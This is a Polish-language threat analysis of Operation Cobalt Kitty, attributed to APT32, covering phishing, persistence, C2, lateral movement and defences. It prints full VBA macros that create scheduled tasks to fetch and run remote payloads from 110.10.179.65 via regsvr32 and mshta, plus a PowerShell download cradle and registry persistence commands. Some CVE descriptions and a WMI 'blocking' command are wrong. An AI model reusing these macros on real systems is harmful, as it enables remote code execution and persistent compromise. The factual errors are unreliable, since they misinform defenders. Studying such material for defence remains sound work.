Poniżej znajduje się kompleksowa analiza **Operacji Cobalt Kitty**, uwzględniająca szczegółowe fazy ataku, metody działania złośliwego oprogramowania, techniki użyte przez grupę APT oraz rekomendacje dotyczące zabezpieczeń.

---

# **Operacja Cobalt Kitty: Dogłębna Analiza i Reverse Engineering**

**Operacja Cobalt Kitty**, przeprowadzona przez grupę OceanLotus (APT32), stanowi jeden z najbardziej wyrafinowanych przykładów zaawansowanego ataku na globalną korporację. Atak obejmował pełny cykl życia APT, wykorzystując techniki fileless malware, lateral movement oraz złożone mechanizmy persistencji.

## **Spis treści**
1. [Wprowadzenie](#wprowadzenie)
2. [Fazy ataku](#fazy-ataku)
   - 2.1 [Penetracja](#penetracja)
   - 2.2 [Foothold i Persistencja](#foothold-i-persistencja)
   - 2.3 [Komunikacja C2](#komunikacja-c2)
   - 2.4 [Rozpoznanie Wewnętrzne](#rozpoznanie-wewnętrzne)
   - 2.5 [Ruch Boczy](#ruch-boczy)
3. [Reverse Engineering: Analiza Kodów](#reverse-engineering-analiza-kodów)
4. [Podatności (CVE) i wektory ataku](#podatności-cve-i-wektory-ataku)
5. [Rekomendacje obronne](#rekomendacje-obronne)
6. [Podsumowanie](#podsumowanie)

---

## **Wprowadzenie**

_Operacja Cobalt Kitty była wieloetapowym atakiem, w którym wykorzystano najnowsze techniki unikania detekcji. Grupa OceanLotus wykorzystała spear-phishing oraz zaawansowane techniki fileless malware, by uzyskać trwałą obecność w środowisku ofiary, kradnąc poufne dane finansowe i intelektualne._

Atak charakteryzował się:
- Zastosowaniem fileless malware działającego wyłącznie w pamięci RAM.
- Zaawansowanymi technikami persistencji z użyciem harmonogramu zadań, rejestru Windows oraz WMI.
- Mechanizmami lateral movement, takimi jak Pass-the-Hash i zdalne wykonywanie kodu przez WMI.
- Unikalnymi C2 profilami ukrywającymi ruch sieciowy jako legalny.

---

## **Fazy Ataku**

### **2.1 Penetracja**
**Metody:**
1. **Spear-Phishing**:
   - Cel: Najważniejsi pracownicy firmy.
   - Techniki:
     - Fałszywe instalatory Flash: Dostarczały zainfekowane wersje Flash Playera.
     - Makra w dokumentach Word: Automatycznie pobierały payloady.

**Szczegóły techniczne:**
- Instalator Flash łączył się z serwerem C2, pobierając plik: `hxxp://110.10.179.65:80/ptF2`.
- Przykład makra Word:
```powershell
Invoke-Expression -Command (New-Object Net.WebClient).DownloadString("http://malicious-site/payload")
```

---

### **2.2 Foothold i Persistencja**
**Mechanizmy Persistencji:**
1. **Windows Registry**:
   - Payloady osadzane w kluczach rejestru, np.:
     ```cmd
     reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Malware /t REG_SZ /d "powershell -encodedCommand..."
     ```
   - Ukrycie w strumieniach NTFS ADS (Alternate Data Streams).

2. **Harmonogram Zadań (Scheduled Tasks)**:
   - Zadania utworzone przy pomocy `schtasks`, np.:
     ```cmd
     schtasks /create /sc DAILY /tn "Windows Update" /tr "mshta.exe about:'<script src=http://malicious-site>'" /f
     ```

3. **Usługi WMI**:
   - Subskrypcje automatycznie uruchamiały kod:
     - EventConsumer i Filter pozwalały na zdalne uruchamianie payloadów.

---

### **2.3 Komunikacja C2**
**Charakterystyka:**
- **DNS Tunneling**: Ukrywanie komunikacji w zapytaniach DNS do legalnych serwerów (np. Google DNS: `8.8.8.8`).
- **Malleable Profiles**: Maskowanie ruchu jako Amazon lub Google.

**Przykład komunikacji**:
- Tunel DNS:
  ```powershell
  Resolve-DnsName -Name "teriava(.)com" -Type A
  ```

---

### **2.4 Rozpoznanie Wewnętrzne**
**Narzędzia i Polecenia**:
1. **PowerShell**:
   ```powershell
   Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress
   ```
2. **Net.exe**:
   - Mapowanie udziałów: `net use \\192.168.1.1\share`.

---

### **2.5 Ruch Boczy**
**Techniki**:
1. **Pass-the-Hash**: Wykorzystanie poświadczeń NTLM.
2. **Zdalne wykonanie kodu przez WMI**:
   ```cmd
   wmic /node:192.168.1.1 process call create "cmd.exe /c whoami"
   ```

---

## **Reverse Engineering: Analiza Kodów**

### **Kod 1: CreateProcessA**
```vbnet
Option Explicit
Private Declare PtrSafe Function CreateProcessA Lib "kernel32" (...)
```
- **Opis**: Kod wykorzystuje WinAPI do tworzenia zadań harmonogramu uruchamiających złośliwe payloady.

### **Kod 2: XML Harmonogramu**
```vbnet
Sub CreateScheduledTaskXML()
  ' Tworzy zadanie za pomocą pliku XML.
End Sub
```
- **Opis**: XML zawiera osadzony skrypt uruchamiany przez `mshta.exe`.

---

## **Podatności (CVE) i Wektory Ataku**

1. **CVE-2017-8759**:
   - Eksploatacja błędu w WMI do zdalnego wykonania kodu.
2. **CVE-2020-0601**:
   - Fałszywe certyfikaty C2 omijające detekcję.
3. **CVE-2018-8581**:
   - Luki w GPO umożliwiające obejście polityk bezpieczeństwa.

---

## **Rekomendacje Obronne**

1. **Wdrożenie GPO**:
   - Blokowanie dostępu do WMI:
     ```cmd
     Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding
     ```
   - Ograniczenie dostępu do PowerShell:
     - Włączenie `Constrained Language Mode`.

2. **Monitorowanie DNS**:
   - Inspekcja zapytań DNS w poszukiwaniu tunelowania.

3. **Detekcja Fileless Malware**:
   - Wdrożenie EDR do monitorowania aktywności w pamięci RAM.

---

## **Podsumowanie**

Operacja Cobalt Kitty stanowi doskonały przykład nowoczesnych zagrożeń w krajobrazie cyberbezpieczeństwa. Atakujący, wykorzystując techniki fileless malware, lateral movement i DNS Tunneling, zdołali osiągnąć długotrwałą obecność w systemie ofiary. Kluczem do ochrony przed tego typu atakami jest wielowarstwowa strategia bezpieczeństwa, oparta na monitorowaniu aktywności w pamięci, audycie procesów oraz edukacji użytkowników.

> **Wniosek**: Każda organizacja powinna regularnie aktualizować swoje procedury bezpieczeństwa, w tym polityki GPO i mechanizmy monitorujące.

--- 

### Rozszerzona analiza kodów makr użytych w Operacji Cobalt Kitty

Poniżej przedstawiam dokładny opis dwóch fragmentów kodów VBA (Visual Basic for Applications), które były wykorzystywane w Operacji Cobalt Kitty do utrzymania obecności malware i wykonania złośliwych skryptów.

---

### **Kod 1: Tworzenie zaplanowanego zadania za pomocą CreateProcessA**

```vba
Option Explicit

' Deklaracja funkcji CreateProcessA z WinAPI
Private Declare PtrSafe Function CreateProcessA Lib "kernel32" ( _
    ByVal lpApplicationName As String, _
    ByVal lpCommandLine As String, _
    ByVal lpProcessAttributes As LongPtr, _
    ByVal lpThreadAttributes As LongPtr, _
    ByVal bInheritHandles As Long, _
    ByVal dwCreationFlags As Long, _
    ByVal lpEnvironment As LongPtr, _
    ByVal lpCurrentDirectory As String, _
    lpStartupInfo As STARTUPINFO, _
    lpProcessInformation As PROCESS_INFORMATION) As Long

' Struktura STARTUPINFO
Private Type STARTUPINFO
    cb As Long
    lpReserved As LongPtr
    lpDesktop As LongPtr
    lpTitle As LongPtr
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As LongPtr
    hStdInput As LongPtr
    hStdOutput As LongPtr
    hStdError As LongPtr
End Type

' Struktura PROCESS_INFORMATION
Private Type PROCESS_INFORMATION
    hProcess As LongPtr
    hThread As LongPtr
    dwProcessId As Long
    dwThreadId As Long
End Type

' Funkcja do zamykania uchwytu procesu
Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As LongPtr) As Long

Sub CreateScheduledTaskWithCreateProcessA()
    Dim sCMDLine As String
    Dim si As STARTUPINFO
    Dim pi As PROCESS_INFORMATION
    Dim lSuccess As Long

    ' Definicja polecenia CMD do utworzenia zadania
    sCMDLine = "schtasks /create /sc MINUTE /tn ""Power Efficiency Diagnostics"" /tr ""regsvr32.exe /s /n /u /i:http://110.10.179.65:80/download/microsoftv.jpg scrobj.dll"" /mo 15 /f"
    
    ' Inicjalizacja struktury STARTUPINFO
    si.cb = Len(si)
    
    ' Uruchomienie polecenia za pomocą CreateProcessA
    lSuccess = CreateProcessA(vbNullString, sCMDLine, 0, 0, False, NORMAL_PRIORITY_CLASS, 0, vbNullString, si, pi)
    
    ' Sprawdzenie wyniku
    If lSuccess = 0 Then
        MsgBox "Nie udało się utworzyć zadania", vbCritical
    Else
        MsgBox "Zadanie zostało utworzone pomyślnie", vbInformation
    End If

    ' Zamykanie uchwytów procesu i wątku
    If pi.hProcess <> 0 Then CloseHandle pi.hProcess
    If pi.hThread <> 0 Then CloseHandle pi.hThread
End Sub
```

#### **Opis działania:**
1. **CreateProcessA**: Funkcja z WinAPI, która umożliwia uruchomienie dowolnego procesu lub aplikacji.
2. **Zadanie harmonogramu**:
   - Utworzony harmonogram wykorzystuje `schtasks`, aby uruchamiać `regsvr32.exe` z złośliwym URL-em (`microsoftv.jpg`), który inicjuje łańcuch infekcji.
   - `regsvr32.exe` to legalne narzędzie systemowe używane do ładowania bibliotek DLL. W tym przypadku ładuje złośliwy obiekt COM.

---

### **Kod 2: Tworzenie zaplanowanego zadania z XML-em**

```vba
Sub CreateScheduledTaskXML()
    Dim tstr As String
    Dim XMLStr As String

    ' Budowanie XML-a dla zadania
    tstr = "<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">" & vbCrLf
    tstr = tstr & "  <Triggers>" & vbCrLf
    tstr = tstr & "    <TimeTrigger>" & vbCrLf
    tstr = tstr & "      <Repetition>" & vbCrLf
    tstr = tstr & "        <Interval>PT15M</Interval>" & vbCrLf
    tstr = tstr & "      </Repetition>" & vbCrLf
    tstr = tstr & "      <StartBoundary>2024-01-01T00:00:00</StartBoundary>" & vbCrLf
    tstr = tstr & "    </TimeTrigger>" & vbCrLf
    tstr = tstr & "  </Triggers>" & vbCrLf
    tstr = tstr & "  <Actions Context=""Author"">" & vbCrLf
    tstr = tstr & "    <Exec>" & vbCrLf
    tstr = tstr & "      <Command>mshta.exe</Command>" & vbCrLf
    tstr = tstr & "      <Arguments>about:""<script language=""vbscript"">" & vbCrLf
    tstr = tstr & "      src=""http://110.10.179.65:80/download/microsoftfp.jpg"";code close</script>""</Arguments>" & vbCrLf
    tstr = tstr & "    </Exec>" & vbCrLf
    tstr = tstr & "  </Actions>" & vbCrLf
    tstr = tstr & "</Task>"

    ' Zapisz XML jako plik tymczasowy
    Dim fso As Object
    Dim tempFile As String
    Set fso = CreateObject("Scripting.FileSystemObject")
    tempFile = Environ("TEMP") & "\ScheduledTask.xml"
    Dim file As Object
    Set file = fso.CreateTextFile(tempFile, True)
    file.WriteLine tstr
    file.Close

    ' Wykonaj polecenie schtasks z wykorzystaniem pliku XML
    Dim sCmd As String
    sCmd = "schtasks /create /tn ""Power Efficiency Diagnostics XML"" /xml """ & tempFile & """ /f"
    Shell sCmd, vbNormalFocus

    ' Usuń plik XML po utworzeniu zadania
    fso.DeleteFile tempFile, True

    MsgBox "Zadanie zostało utworzone pomyślnie przy użyciu XML", vbInformation
End Sub
```

#### **Opis działania:**
1. **Generowanie XML**:
   - Kod buduje XML zawierający polecenie `mshta.exe`, które uruchamia kod VBScript osadzony w zewnętrznym źródle.
2. **mshta.exe**:
   - Narzędzie systemowe używane do uruchamiania aplikacji HTML i skryptów. W tym przypadku wykorzystywane jako mechanizm do zdalnego uruchamiania kodu.
3. **Zadanie harmonogramu**:
   - XML rejestruje zadanie systemowe wywołujące `mshta.exe` co 15 minut.

---

### **Podsumowanie działania kodów VBA**

Oba powyższe fragmenty kodu pokazują różne techniki używane przez atakujących:
- **Pierwszy kod** wykorzystuje `CreateProcessA` do bezpośredniego tworzenia zadania harmonogramu z payloadem w `regsvr32.exe`.
- **Drugi kod** stosuje bardziej złożone podejście z wykorzystaniem XML i `mshta.exe`, co ułatwia ukrywanie działań złośliwego oprogramowania.

Kody te podkreślają wagę monitorowania harmonogramów zadań i aktywności procesów systemowych w celu wykrywania nieautoryzowanych działań.